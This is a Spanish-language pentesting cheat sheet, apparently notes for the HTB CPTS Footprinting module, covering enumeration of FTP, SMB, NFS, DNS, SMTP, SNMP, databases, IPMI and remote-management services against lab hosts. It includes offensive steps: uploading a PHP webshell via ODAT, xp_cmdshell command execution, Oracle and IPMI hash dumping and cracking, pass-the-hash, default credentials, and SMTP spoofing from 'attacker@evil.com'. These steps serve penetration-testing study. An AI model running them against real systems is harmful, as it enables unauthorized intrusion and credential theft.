---
title: "Footprinting"
description: "Enumeración por servicio: FTP, SMB, NFS, DNS, SMTP y más."
sidebar:
  order: 2
  label: "Footprinting"
---
> Enumeración profunda por servicio: FTP, SMB, NFS, DNS, SMTP, IMAP/POP3, SNMP, MySQL, MSSQL, Oracle TNS, IPMI, SSH, Rsync, R-Services, RDP, WinRM, WMI. El módulo más denso del CPTS en términos de herramientas y comandos.

---


## OSINT / Infrastructure Enumeration

```bash
# Subdominios via Certificate Transparency
curl -s "https://crt.sh/?q=inlanefreight.com&output=json" | jq '.[].name_value' | sed 's/"//g' | sort -u

# Shodan — ASN, puertos, tech stack
shodan search "inlanefreight.com"

# DNS — registro NS
dig ns inlanefreight.htb @<nameserver>

# DNS — todos los registros
dig any inlanefreight.htb @10.129.14.128

# Zone Transfer (AXFR) — jackpot si está mal configurado
dig axfr inlanefreight.htb @10.129.14.128
dig axfr internal.inlanefreight.htb @10.129.14.128

# Subdomain brute force
for sub in $(cat /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt); do
  dig $sub.inlanefreight.htb @10.129.14.128 | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt
done

# DNSenum (más completo — AXFR + brute)
dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt \
  -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb
```

### Tipos de registros DNS clave

| Registro | Descripción |
|----------|-------------|
| `A` | IPv4 del hostname |
| `AAAA` | IPv6 del hostname |
| `MX` | Servidor de correo |
| `NS` | Nameserver autoritativo |
| `TXT` | SPF, DKIM, verificaciones de dominio |
| `CNAME` | Alias → otro hostname |
| `PTR` | Reverse DNS (IP → hostname) |
| `SOA` | Start of Authority — serial, refresh, TTY |

```bash
# Versión del servidor DNS (bind) — útil para CVE search
dig CH TXT version.bind @<nameserver>
```

---

## FTP — puerto 21 (data: 20)

```bash
# Nmap — detectar anonymous login y versión
sudo nmap -sV -sC -p21 <IP>
sudo nmap -sV --script ftp-anon,ftp-bounce,ftp-syst -p21 <IP>

# Conectar anónimo
ftp -p <IP>          # -p modo pasivo (evita problemas de NAT)
> Name: anonymous
> ls -la
> cd pub
> get archivo.txt
> exit

# Descargar todo el FTP (modo no-pasivo)
wget -m --no-passive ftp://anonymous:anonymous@<IP>

# FTP sobre TLS (FTPS)
openssl s_client -connect <IP>:21 -starttls ftp
```

### Configuraciones peligrosas de FTP

| Setting | Riesgo |
|---------|--------|
| `anonymous_enable=YES` | Login sin credenciales |
| `anon_upload_enable=YES` | Subir archivos anónimamente |
| `no_anon_password=YES` | Sin password para anónimo |
| `hide_ids=YES` | Muestra "ftp" en lugar del UID real |
| `ls_recurse_enable=YES` | `ls -R` expone toda la estructura |

---

## SMB — puertos 139, 445

```bash
# Listar shares sin autenticación (null session)
smbclient -N -L \\\\<IP>

# Conectar a share
smbclient -U usuario \\\\<IP>\\share
smbclient -N \\\\<IP>\\share           # sin creds
> ls / cd / get archivo / put archivo

# smbmap — ver permisos en todos los shares
smbmap -H <IP>
smbmap -H <IP> -u usuario -p password

# CrackMapExec — enumeración rápida
crackmapexec smb <IP>
crackmapexec smb <IP> -u '' -p '' --shares
crackmapexec smb <IP> -u usuario -p password --shares --users

# rpcclient — enumeración RPC (null session)
rpcclient -U "" <IP>
rpcclient > srvinfo
rpcclient > enumdomains
rpcclient > querydominfo
rpcclient > netshareenumall
rpcclient > enumdomusers
rpcclient > queryuser 0x3e8        # info usuario por RID
# Brute force RIDs para enumerar usuarios
for i in $(seq 500 1100); do
  rpcclient -N -U "" <IP> -c "queryuser 0x$(printf '%x\n' $i)" 2>/dev/null | grep -E "User Name|user_rid|group_rid" && echo "RID: $i"
done

# enum4linux-ng — todo en uno
enum4linux-ng -A <IP>
enum4linux-ng -A -C <IP>          # con credenciales en el prompt
```

### Configuraciones peligrosas de SMB

| Setting | Riesgo |
|---------|--------|
| `browseable = yes` | Shares visibles sin auth |
| `read only = no` | Escritura habilitada |
| `guest ok = yes` | Acceso sin creds |
| `enable privileges = yes` | Permite privesc via SMB |
| `create mask = 0777` | Permisos de ejecución en archivos subidos |

---

## NFS — puertos 111 (RPC), 2049

```bash
# Listar exports disponibles
showmount -e <IP>

# Montar share NFS
sudo mkdir /mnt/nfs
sudo mount -t nfs <IP>:/share /mnt/nfs -o nolock
ls -la /mnt/nfs

# Nmap — enumerar NFS
sudo nmap -sV -p111,2049 --script nfs* <IP>
# Muestra: exports, mountd, shares montados, permissions

# Desmontar
sudo umount /mnt/nfs
```

### Configuraciones peligrosas de NFS

| Setting | Riesgo |
|---------|--------|
| `rw` | Read/write access desde cualquier host |
| `insecure` | Acepta puertos >1024 |
| `nohide` | Muestra sistemas de archivos montados |
| `no_root_squash` | root del cliente = root en el servidor |

> **`no_root_squash` = critical:** si puedes escribir en el share, crea un binario SUID como root → privesc directo.

---

## SMTP — puertos 25, 587, 465

```bash
# Nmap — scripts SMTP
sudo nmap -sC -sV -p25 <IP>
sudo nmap -p25 --script smtp-open-relay -v <IP>     # 16 tests de open relay

# Interacción manual via telnet
telnet <IP> 25
HELO mail1.inlanefreight.htb
EHLO mail1                          # muestra extensiones soportadas
VRFY root                           # verificar si usuario existe (252 = posible existencia)
MAIL FROM: <attacker@evil.com>
RCPT TO: <victim@target.com> NOTIFY=success,failure
DATA
From: <...>
To: <...>
Subject: Test
.
QUIT
```

### Comandos SMTP clave

| Comando | Uso |
|---------|-----|
| `EHLO` | Inicia sesión ESMTP + lista extensiones |
| `VRFY <user>` | Verifica si usuario existe |
| `EXPN <alias>` | Expande un alias de correo |
| `MAIL FROM:` | Define remitente |
| `RCPT TO:` | Define destinatario |
| `DATA` | Inicia cuerpo del email |

**Open Relay:** `mynetworks = 0.0.0.0/0` → permite enviar emails como cualquier remitente → spoofing/spam.

---

## IMAP / POP3 — puertos 143, 993 (IMAP), 110, 995 (POP3)

```bash
# Nmap — escanear puertos mail
sudo nmap -sV -p110,143,993,995 -sC <IP>

# Conectar IMAPS con curl (enumerar mailboxes)
curl -k 'imaps://<IP>' --user usuario:password
curl -k 'imaps://<IP>' --user usuario:password -v  # TLS details + banner

# Conectar via OpenSSL (interactivo)
openssl s_client -connect <IP>:pop3s
openssl s_client -connect <IP>:imaps
```

### Comandos IMAP (tras login)

```
1 LOGIN usuario password
1 LIST "" *                 # listar carpetas
1 SELECT INBOX              # seleccionar mailbox
1 FETCH 1 all               # leer mensaje ID 1
1 LOGOUT
```

### Comandos POP3

```
USER usuario
PASS password
STAT                        # número de mensajes
LIST                        # lista con tamaños
RETR 1                      # descargar mensaje 1
DELE 1                      # marcar para borrar
QUIT
```

---

## SNMP — UDP 161 (agente), UDP 162 (traps)

```bash
# Enumerar todo el árbol OID (versión 1/2c con community string)
snmpwalk -v2c -c public <IP>
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.1.5.0   # hostname

# Brute force community strings
onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt <IP>

# Brute force OIDs con community conocida
braa public@<IP>:.1.3.6.*
```

### Versiones SNMP

| Versión | Seguridad |
|---------|-----------|
| `v1` | Sin autenticación, sin cifrado — todo plaintext |
| `v2c` | Community string en plaintext — igual de inseguro |
| `v3` | Auth + cifrado con contraseña — el único seguro |

### Configuraciones peligrosas de SNMP

| Setting | Riesgo |
|---------|--------|
| `rwuser noauth` | R/W al árbol OID completo sin auth |
| `rwcommunity <string> 0.0.0.0/0` | R/W desde cualquier IP |
| Community string `public` activa | Default — dump del sistema completo |

---

## MySQL — TCP 3306

```bash
# Nmap — scripts MySQL (detección de empty password, usuarios, hashes)
sudo nmap -sV -sC -p3306 --script mysql* <IP>

# Conectar
mysql -u root -h <IP>
mysql -u root -pP4SSw0rd -h <IP>

# Comandos SQL útiles
show databases;
use <database>;
show tables;
show columns from <tabla>;
select * from <tabla>;
select * from <tabla> where <columna> = "string";
select version();
select user();
select @@hostname;
```

### Configuraciones peligrosas de MySQL

| Setting | Riesgo |
|---------|--------|
| `user`/`password` en plaintext en config | Credenciales expuestas en `/etc/mysql/mysql.conf.d/mysqld.cnf` |
| `debug = ON` | Output verboso → info sensible en web |
| `secure_file_priv = ""` | Permite `LOAD DATA` / `SELECT INTO OUTFILE` sin restricción |

---

## MSSQL — TCP 1433

```bash
# Nmap — scripts MSSQL
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,\
ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes \
--script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,\
mssql.instance-name=MSSQLSERVER -sV -p1433 <IP>

# Metasploit — mssql_ping
msf6 > use auxiliary/scanner/mssql/mssql_ping
msf6 > set RHOSTS <IP>
msf6 > run

# Conectar con Impacket
python3 mssqlclient.py Administrator@<IP> -windows-auth

# Comandos SQL
SQL> select name from sys.databases
SQL> select @@version
SQL> select user_name()
SQL> exec xp_cmdshell 'whoami'   # si está habilitado → RCE
```

### Bases de datos del sistema MSSQL

| DB | Descripción |
|----|-------------|
| `master` | Toda la info del sistema SQL Server |
| `model` | Template para nuevas DBs |
| `msdb` | SQL Server Agent (jobs, alertas) |
| `tempdb` | Objetos temporales |
| `resource` | Solo lectura — objetos del sistema |

**`xp_cmdshell`** habilitado → ejecución de comandos OS como el usuario del servicio SQL.

---

## Oracle TNS — TCP 1521

```bash
# Nmap — detectar versión TNS
sudo nmap -p1521 -sV <IP> --open

# Brute force SID
sudo nmap -p1521 -sV <IP> --open --script oracle-sid-brute

# ODAT — todo en uno (enumeración completa)
./odat.py all -s <IP>
# Encuentra credenciales, SIDs, vulnerabilidades, permite subir archivos

# Conectar con sqlplus (tras obtener creds + SID)
sqlplus scott/tiger@<IP>/XE
sqlplus scott/tiger@<IP>/XE as sysdba    # si scott tiene privs de DBA

# Comandos Oracle
SQL> select table_name from all_tables;
SQL> select * from user_role_privs;
SQL> select name, password from sys.user$;   # extraer hashes (como sysdba)

# Subir webshell via ODAT (si hay webserver)
./odat.py utlfile -s <IP> -d XE -U scott -P tiger --sysdba \
  --putFile C:\\inetpub\\wwwroot shell.php ./shell.php

# Verificar webshell
curl http://<IP>/shell.php?cmd=whoami
```

**Credenciales Oracle por defecto:**
- Oracle 9: `CHANGE_ON_INSTALL`
- Oracle DBSNMP: `dbsnmp`
- scott/tiger (clásico de labs)

---

## IPMI — UDP 623

```bash
# Nmap — detectar IPMI
sudo nmap -sU --script ipmi-version -p623 <IP>

# Metasploit — ipmi_version
msf6 > use auxiliary/scanner/ipmi/ipmi_version
msf6 > set RHOSTS <IP>; run

# Metasploit — dump de hashes RAKP (IPMI 2.0 flaw)
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
msf6 > set RHOSTS <IP>; run
# → obtiene hash SHA1 del password de CUALQUIER usuario válido

# Crackear hash
hashcat -m 7300 ipmi.txt wordlist.txt
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u  # HP iLO factory default
```

### Credenciales BMC por defecto

| Producto | Usuario | Password |
|----------|---------|----------|
| Dell iDRAC | `root` | `calvin` |
| HP iLO | `Administrator` | 8 chars alfanumérico (randomizado) |
| Supermicro IPMI | `ADMIN` | `ADMIN` |

**RAKP flaw:** IPMI 2.0 envía un hash salted SHA1/MD5 del password al cliente ANTES de autenticarse. No hay fix — es parte del protocolo.

---

## Linux Remote Management

### SSH — TCP 22

```bash
# Fingerprint del servidor SSH
git clone https://github.com/jtesta/ssh-audit.git && cd ssh-audit
./ssh-audit.py <IP>

# Ver métodos de autenticación soportados
ssh -v user@<IP>

# Forzar autenticación por password (para brute force)
ssh -v user@<IP> -o PreferredAuthentications=password
```

### Configuraciones peligrosas de SSH

| Setting | Riesgo |
|---------|--------|
| `PasswordAuthentication yes` | Permite brute force |
| `PermitEmptyPasswords yes` | Acceso sin password |
| `PermitRootLogin yes` | Login directo como root |
| `Protocol 1` | SSH-1 vulnerable a MITM |
| `X11Forwarding yes` | CVE-2016-3115 (RCE en v7.2p1) |

### Rsync — TCP 873

```bash
# Detectar Rsync
sudo nmap -sV -p873 <IP>

# Enumerar shares disponibles
nc -nv <IP> 873
> #list

# Listar archivos en share
rsync -av --list-only rsync://<IP>/dev

# Descargar todo el share
rsync -av rsync://<IP>/dev /tmp/rsync_dev

# Rsync sobre SSH
rsync -av -e "ssh -p2222" rsync://<IP>/share /tmp/
```

### R-Services — puertos 512, 513, 514

```bash
# Nmap
sudo nmap -sV -p512,513,514 <IP>

# rlogin — login en host remoto (si .rhosts mal configurado)
rlogin <IP> -l usuario

# rwho — usuarios autenticados en la red
rwho

# rusers — detallado por IP
rusers -al <IP>
```

**`.rhosts` con `+ +`** → cualquier usuario desde cualquier host puede conectar sin credenciales.

---

## Windows Remote Management

### RDP — TCP/UDP 3389

```bash
# Nmap — scripts RDP (NLA, versión, dominio)
nmap -sV -sC -p3389 --script rdp* <IP>

# rdp-sec-check — protocolo y cifrado soportado
git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git
./rdp-sec-check.pl <IP>

# Conectar via xfreerdp
xfreerdp /u:usuario /p:"password" /v:<IP>
xfreerdp /u:usuario /p:"password" /v:<IP> /cert:ignore   # ignorar cert self-signed
```

### WinRM — TCP 5985 (HTTP), 5986 (HTTPS)

```bash
# Nmap — detectar WinRM
nmap -sV -sC -p5985,5986 --disable-arp-ping -n <IP>

# evil-winrm — shell PowerShell remota
evil-winrm -i <IP> -u usuario -p "password"
evil-winrm -i <IP> -u usuario -H "NTLM_HASH"  # pass-the-hash
```

### WMI — TCP 135 (inicio) → puerto aleatorio

```bash
# wmiexec.py — ejecutar comandos
/usr/share/doc/python3-impacket/examples/wmiexec.py usuario:"password"@<IP> "whoami"
wmiexec.py usuario:"password"@<IP>   # shell interactiva
```

---

## Quick Reference — Puertos y herramientas

| Servicio | Puerto | Herramientas clave |
|----------|--------|--------------------|
| FTP | TCP 21/20 | `ftp`, `wget -m`, nmap `ftp-anon` |
| SMB | TCP 139/445 | `smbclient`, `rpcclient`, `smbmap`, `CrackMapExec`, `enum4linux-ng` |
| NFS | TCP/UDP 111, 2049 | `showmount`, `mount -t nfs`, nmap `nfs*` |
| DNS | UDP/TCP 53 | `dig`, `dnsenum`, `dig axfr` |
| SMTP | TCP 25/587/465 | `telnet`, `VRFY`, nmap `smtp-open-relay` |
| IMAP | TCP 143/993 | `curl imaps://`, `openssl s_client` |
| POP3 | TCP 110/995 | `openssl s_client`, `ncat` |
| SNMP | UDP 161/162 | `snmpwalk`, `onesixtyone`, `braa` |
| MySQL | TCP 3306 | `mysql`, nmap `mysql*` |
| MSSQL | TCP 1433 | `mssqlclient.py`, nmap `ms-sql*`, MSF |
| Oracle TNS | TCP 1521 | `odat.py`, `sqlplus`, nmap `oracle-sid-brute` |
| IPMI | UDP 623 | MSF `ipmi_version`, MSF `ipmi_dumphashes`, hashcat `-m 7300` |
| SSH | TCP 22 | `ssh-audit`, `ssh -v` |
| Rsync | TCP 873 | `rsync --list-only`, `nc` |
| R-Services | TCP 512-514 | `rlogin`, `rwho`, `rusers` |
| RDP | TCP 3389 | `xfreerdp`, nmap `rdp*`, `rdp-sec-check` |
| WinRM | TCP 5985/5986 | `evil-winrm` |
| WMI | TCP 135+ | `wmiexec.py` |

---

## Pitfalls / Gotchas

- **SNMP v1/v2c con community `public`** es el más común en examen — siempre probar.
- **`no_root_squash` en NFS** → crea binario SUID en el share como root del cliente → shell de root. Checkearlo siempre al montar.
- **AXFR sin restricción** (`allow-transfer any`) → expone toda la zona interna incluyendo DCs, IPs internas. Buscar zona `internal.*` también.
- **IPMI RAKP flaw no tiene parche** — si encuentras UDP 623, siempre volcar hashes con MSF y crackear.
- **Oracle TNS:** el SID es obligatorio para conectar. Brute-force con `oracle-sid-brute` o ODAT primero.
- **`VRFY` en SMTP no siempre es fiable** — código 252 puede ser falso positivo. No confiar ciegamente.
- **rpcclient null session** puede estar bloqueado en Windows modernos con SMB signing. `enum4linux-ng` da más info de forma robusta.
- **evil-winrm** requiere que WinRM esté habilitado (default en Windows Server 2012+). Usar `Test-WsMan` desde PowerShell para verificar.
- **RDP con `--packet-trace` en Nmap** → el cookie `mstshash=nmap` es detectado por EDR. En entornos con detección usar rdp-sec-check.pl en su lugar.
- **Password reuse** es la cadena más común: creds de FTP → SSH → WinRM → BD. Siempre probar en todos los servicios.

---

## Cheatsheets relacionados

- [Network Enumeration with Nmap](/metodologias/recon/network-enumeration-nmap/) — Discovery inicial y NSE scripts antes de footprinting por servicio
- [Attacking Common Services](/metodologias/servicios/attacking-common-services/) — Explotación real de FTP, SMB, RDP, WinRM, DNS, SQL
- [Password Attacks](/metodologias/exploitation/password-attacks/) — Hashcat con hashes NTLM, IPMI (mode 7300), Oracle
- [Active Directory Enumeration & Attacks](/metodologias/active-directory/active-directory-enumeration-attacks/) — RPC/SMB en contexto de dominio
- [Pivoting, Tunneling, and Port Forwarding](/metodologias/pivoting/pivoting-tunneling-port-forwarding/) — Acceso a servicios internos tras primer foothold
